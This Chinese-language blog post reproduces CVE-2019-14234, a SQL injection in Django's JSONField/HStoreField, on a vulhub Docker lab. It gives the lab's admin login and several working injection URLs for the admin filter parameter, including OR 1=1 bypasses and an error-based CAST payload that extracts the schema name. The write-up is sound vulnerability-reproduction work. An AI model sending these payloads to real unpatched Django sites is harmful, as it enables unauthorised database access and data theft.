---
layout: post
title: Django JSONField/HStoreField SQL注入漏洞
tags: Django
categories: CVE-2019-14234
---

# Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）

## 漏洞描述

该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。

## 漏洞描述

首先部署是使用的GitHub中的[vulhub](!https://github.com/vulhub/vulhub.git)项目docker一键部署的。

环境启动后，访问`http://your-ip:8000`，即可看到Django默认首页

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2019-14234/15947068475147.jpg)

然后登陆后台`http://your-ip:8000/admin/`，用户名密码为admin、a123123123。

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2019-14234/15947069259549.jpg)

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2019-14234/15947069721364.jpg)

登陆后台后，进入模型Collection的管理页面`http://your-ip:8000/admin/vuln/collection/`：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2019-14234/15947097074853.jpg)

然后在GET参数中构造detail__a'b=123提交，其中detail是模型Collection中的JSONField：`http://your-ip:8000/admin/vuln/collection/?detail__a%27b=123`单引号注入成功，返回报错语句：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2019-14234/15947098541820.jpg)

这里可以尝试用')闭合前面的('配合or 1=1 然后用OR ("vuln_collection"."detail" -> 'a来闭合后面的')使sql语句正常执行，页面显示了全部的两个模型：`http://your-ip:8000/admin/vuln/collection/?detail__aa%27%3f%27p%27)%20OR%201%3d1%20%20OR%20%20(%22vuln_collection%22.%22detail%22%20-%3E%20%27a`

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2019-14234/15947100080900.jpg)

也可以直接用-- 直接注释掉后面的')
`http://your-ip:8000/admin/vuln/collection/?detail__a%27%3f%27a%27)%20OR%201%3d1%20--`

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2019-14234/15947101436934.jpg)

换成 or 1=2，不显示模型：

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2019-14234/15947099771211.jpg)

利用报错注入获取数据库名

```
http://your-ip:8000/admin/vuln/collection/?detail__a%27%3f%27a%27)%20and%207778%3dCAST((SELECT%20schemaname%20FROM%20pg_tables%20limit%201)::text%20AS%20NUMERIC)%20--
```

![](https://github.com/aHlo666/blog-image/raw/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Django/CVE-2019-14234/15947111900488.jpg)

## 受影响版本

Django 1.11.x < 1.11.23
Django 2.1.x < 2.1.11
Django 2.2.x < 2.2.4

## 参考链接

https://xz.aliyun.com/t/5896

https://www.jianshu.com/p/ba0297da2c2e